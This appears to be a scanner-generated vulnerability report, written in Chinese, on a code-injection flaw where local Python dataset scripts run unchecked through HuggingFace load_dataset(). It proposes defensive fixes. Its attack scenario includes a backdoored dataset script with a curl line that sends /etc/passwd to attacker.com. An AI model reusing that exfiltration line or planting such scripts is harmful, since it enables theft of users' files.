# VULN-tools-load_dataset-003：load_dataset执行任意Python脚本致代码注入风险

## 漏洞元数据

| 字段 | 值 |
|------|-----|
| **ID** | VULN-tools-load_dataset-003 |
| **类型** | Python 脚本执行 (CWE-94) |
| **严重性** | High |
| **CWE** | CWE-94：代码生成控制不当（代码注入） |
| **位置** | tools/data_handler.py (第 518-526 行) |
| **函数** | `build_dataset()` |
| **入口点** | tools/preprocess_data.py - main() |
| **信任级别** | untrusted_local |

## 漏洞描述

通过 `--input` 命令行参数传递的本地 Python 脚本被直接通过 HuggingFace 的 `load_dataset()` 函数执行，无任何验证或安全措施。`_has_py_script()` 函数仅验证 `.py` 文件扩展名是否存在，但不验证脚本内容、来源或行为。恶意数据集生成脚本可在数据集加载过程中执行任意代码。

## 受影响代码

### 主要漏洞函数 (tools/data_handler.py, 第 505-526 行)

```python
def build_dataset(args):
    """loading dataset by huggingface"""
    if args.handler_name == "MOSSInstructionHandler" or args.handler_name == "MOSSMultiTurnHandler":
        # for MOSS, streaming is needed.
        args.streaming = True
    if args.hf_datasets_params:
        with open(args.hf_datasets_params, 'r') as fin:
            param_dict = json.load(fin)
        return load_dataset(**param_dict)
    cache_dir = DEFAULT_CACHE_DIR
    split_flag = "train"
    load_from_local = os.path.exists(args.input)
    if load_from_local:
        if _has_py_script(args.input):                        # 漏洞点：仅检查 .py 扩展名
            logger.info("loading data from a local python script")
            raw_datasets = load_dataset(                      # 代码执行：脚本被执行
                args.input,
                split=split_flag,
                num_proc=None if args.streaming else args.workers,
                cache_dir=cache_dir,
                streaming=args.streaming
            )
```

### 不充分验证函数 (tools/data_handler.py, 第 490-502 行)

```python
def _has_py_script(input_name):
    if os.path.isdir(input_name):
        dir_name = os.path.basename(input_name)
        if os.path.exists(os.path.join(input_name, dir_name + '.py')):
            has_py_script = True
        else:
            has_py_script = False
    else:
        if input_name.split('.')[-1] == 'py':                 # 仅检查文件扩展名
            has_py_script = True
        else:
            has_py_script = False
    return has_py_script
```

### 入口点 (tools/preprocess_data.py, 第 172-179 行)

```python
def main():
    args = get_args()

    tokenizer = build_tokenizer(args)
    splitter = build_splitter(args)

    logger.info("building dataset: %s", args.input)
    raw_data = build_dataset(args)                            # 用户输入流向此处
```

## 数据流分析

```
argv (命令行) 
    ↓ 
argparse.parse_args() 
    ↓ 
args.input (用户控制的路径)
    ↓
os.path.exists(args.input)
    ↓
_has_py_script(args.input) → 仅检查 .py 扩展名
    ↓
load_dataset(args.input) → 执行 Python 脚本
```

## 攻击场景

1. **攻击者准备恶意数据集生成器**：
   ```python
   # malicious_dataset.py
   import os
   import subprocess
   
   # 此文件看似正常 HuggingFace 数据集脚本
   # 但包含后门代码
   
   # 恶意代码在导入时执行
   subprocess.run(['curl', 'http://attacker.com/exfil', '-d', open('/etc/passwd').read()])
   
   # 正常数据集接口（伪装）
   import datasets
   class MaliciousDataset(datasets.GeneratorBasedBuilder):
       def _split_generators(self, dl_manager):
           # ... 正常的数据集代码
   ```

2. **用户下载或接收恶意脚本**，来源：
   - HuggingFace Hub（社区数据集）
   - 共享网络驱动器
   - 邮件附件
   - 被入侵的仓库

3. **用户运行预处理工具**：
   ```bash
   python tools/preprocess_data.py \
       --input ./malicious_dataset.py \
       --tokenizer-type GPT2BPETokenizer \
       --output-prefix ./processed_data
   ```

4. **任意代码以用户权限执行**。

## 安全影响

| 影响类别 | 严重性 | 描述 |
|----------|--------|------|
| **远程代码执行** | High | 攻击者可执行任意 Python 代码 |
| **数据泄露** | High | 可访问敏感文件、凭证、环境变量 |
| **横向移动** | Medium | 大型攻击链中潜在的跳板点 |
| **权限提升** | Medium | 若在提升上下文中运行（可能但不太可能） |

## 与已知安全措施对比

### HuggingFace Datasets 安全模型

HuggingFace 的 `load_dataset()` 函数设计为执行数据集生成脚本。然而：

1. **无 trust_remote_code 等效机制**：不同于 `AutoTokenizer.from_pretrained()` 在新版默认 `trust_remote_code=False`，带本地脚本路径的 `load_dataset()` 无此保护。

2. **无安全警告**：代码不警告用户输入脚本将被执行。

3. **项目自身安全说明承认部分风险**：SECURITYNOTE.md (第 118 行) 提到：
   > "数据集可能包含敏感或不合法内容，导致合规问题。数据集中可能存在质量问题，如标签错误或数据偏差"
   
   但这仅覆盖**数据质量**问题，未提及**代码执行**风险！

## 现有缓解措施

| 缓解措施 | 状态 | 证据 |
|----------|------|------|
| 内容验证 | ❌ 未实施 | `_has_py_script()` 仅检查扩展名 |
| 脚本签名验证 | ❌ 未实施 | 无签名检查 |
| 沙箱执行 | ❌ 未实施 | 直接 `load_dataset()` 调用 |
| 安全警告 | ❌ 未实施 | 无脚本执行警告 |
| 输入过滤 | ❌ 未实施 | 直接使用路径 |
| 白名单/黑名单 | ❌ 未实施 | 无路径限制 |

## 代码库证据

### tokenizer 模块无保护（对比）

tokenizer 模块实施 `trust_remote_code=False`：
```python
# mindspeed/tokenizer/tokenizer.py (第 75 行)
hf_tokenizer_kwargs["trust_remote_code"] = False
```

但 data_handler.py 中的 `load_dataset()` 无等效保护。

## 修复建议

### 优先级 1：添加安全警告

```python
def build_dataset(args):
    """loading dataset by huggingface"""
    # ...
    if load_from_local:
        if _has_py_script(args.input):
            logger.warning(
                "安全警告：从 Python 脚本 '%s' 加载数据集。"
                "此脚本将被执行。仅使用来自可信来源的脚本！",
                args.input
            )
            # 可选提示用户确认
            # if sys.stdin.isatty():
            #     response = input("继续? [y/N]: ")
            #     if response.lower() != 'y':
            #         sys.exit(1)
```

### 优先级 2：实施脚本白名单

```python
# 已知良性脚本的配置
ALLOWED_DATASET_SCRIPTS = [
    # 添加已知良性脚本的哈希或路径模式
]

def _validate_script_safety(script_path):
    """验证脚本来自可信来源。"""
    import hashlib
    
    # 计算脚本哈希
    with open(script_path, 'rb') as f:
        script_hash = hashlib.sha256(f.read()).hexdigest()
    
    # 检查白名单
    if script_hash not in ALLOWED_DATASET_SCRIPTS:
        raise SecurityError(
            f"数据集脚本 {script_path} 不在可信白名单中。"
            f"哈希: {script_hash}"
        )
```

### 优先级 3：添加沙箱选项

```python
def build_dataset(args):
    # ...
    if _has_py_script(args.input):
        if args.sandbox_dataset_script:
            # 使用受限 Python 环境
            raw_datasets = _load_dataset_sandboxed(args.input, ...)
        else:
            logger.warning("无沙箱执行数据集脚本...")
            raw_datasets = load_dataset(args.input, ...)
```

### 优先级 4：更新文档

添加到 SECURITYNOTE.md：
```markdown
### 数据集脚本执行警告

当使用 `--input` 参数指定本地 Python 脚本作为数据集来源时，该脚本将被执行。
请确保：
1. 仅使用来自可信来源的数据集脚本
2. 在运行前检查脚本内容
3. 考虑使用非脚本数据格式（如 JSON, Parquet, CSV）
```

## 参考资料

- **CWE-94**：代码生成控制不当（代码注入） - https://cwe.mitre.org/data/definitions/94.html
- **HuggingFace Datasets 安全**：https://huggingface.co/docs/datasets/security
- **ML 框架中的类似漏洞**：
  - CVE-2025-32434 (PyTorch torch.load)
  - 各 ML 框架中的模型文件代码执行

## 附加上下文

| 因素 | 值 |
|------|-----|
| 攻击复杂度 | Low |
| 所需权限 | 用户执行上下文 |
| 用户交互 | Required（用户必须运行工具） |
| 范围 | Changed（可影响其他进程/文件） |
| 框架上下文 | 内部训练框架 - 预期可信管理员场景 |
| 实际可能性 | Medium - 取决于用户是否从不可信来源下载脚本 |

## 验证

验证此漏洞：

1. 创建测试脚本，执行时写入已知位置：
   ```python
   # test_dataset.py
   open('/tmp/pwned.txt', 'w').write('代码已执行！')
   raise SystemExit
   ```

2. 运行：
   ```bash
   python tools/preprocess_data.py \
       --input ./test_dataset.py \
       --tokenizer-type GPT2BPETokenizer \
       --output-prefix ./test_output
   ```

3. 检查 `/tmp/pwned.txt` 是否创建（确认代码执行）。

---

*由安全扫描器于 2026-04-20 生成*